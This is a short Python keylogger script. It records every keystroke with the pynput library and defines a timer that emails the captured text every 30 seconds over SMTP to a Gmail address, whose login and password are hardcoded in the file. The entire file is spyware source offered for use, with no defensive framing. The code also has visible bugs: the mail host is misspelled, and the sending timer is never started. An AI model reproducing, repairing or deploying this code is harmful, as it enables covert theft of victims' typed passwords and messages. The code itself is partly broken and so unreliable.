import pynput.keyboard
import smtplib
import threading


a=""
def callback_function(key):
    global a
    try:
        a = a + key.char
    except AttributeError:
        if key == key.space:
            a = a + " "
        elif key == key.enter:
            a = a + "\n"
        else:
            a = a + str(key)
    except:
        pass

    print(a)

keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)

def send_mail(email,password,message):
    email_server=smtplib.SMTP("smtb.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()



def threading_function():
    global a
    send_mail("kodrod10@gmail.com", "Rodrigez@13", a.encode("utf-8"))
    a=""
    time_object = threading.Timer(30,threading_function)
    time_object.start()



with keyboard_listener:
    keyboard_listener.join()
